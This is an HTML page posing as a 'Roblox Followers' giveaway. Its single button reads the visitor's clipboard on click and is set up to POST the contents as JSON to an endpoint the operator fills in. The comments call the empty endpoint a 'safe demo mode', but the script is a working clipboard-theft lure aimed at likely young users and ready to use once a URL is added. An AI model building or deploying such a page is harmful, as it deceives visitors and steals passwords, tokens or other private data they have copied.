<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Roblox Followers</title>
<style>
html,body{margin:0;width:100%;height:100%}
body{display:grid;place-items:center;background:#0b0b10;font-family:Arial,sans-serif}
button{
  border:0;border-radius:18px;padding:24px 42px;
  font-size:30px;font-weight:700;cursor:pointer;
  background:#fff;color:#111;
  box-shadow:0 18px 50px rgba(0,0,0,.35)
}
button:active{transform:scale(.98)}
</style>
</head>
<body>
<button id="main">Roblox Followers</button>
<script>
const button=document.getElementById("main");

// Put your own HTTPS receiving endpoint here when you have one.
// The site will not transmit clipboard data unless this is configured.
const SEND_ENDPOINT="";

button.addEventListener("click", async ()=>{
  try {
    if (!navigator.clipboard?.readText) throw new Error();
    const text=await navigator.clipboard.readText();

    if (!SEND_ENDPOINT) {
      // Safe demo mode: clipboard is read only after the visitor's click,
      // but it is not sent anywhere.
      return;
    }

    await fetch(SEND_ENDPOINT,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({clipboardText:text})
    });
  } catch(e) {
    // No clipboard contents are displayed or exposed by the page.
  }
});
</script>
</body>
</html>
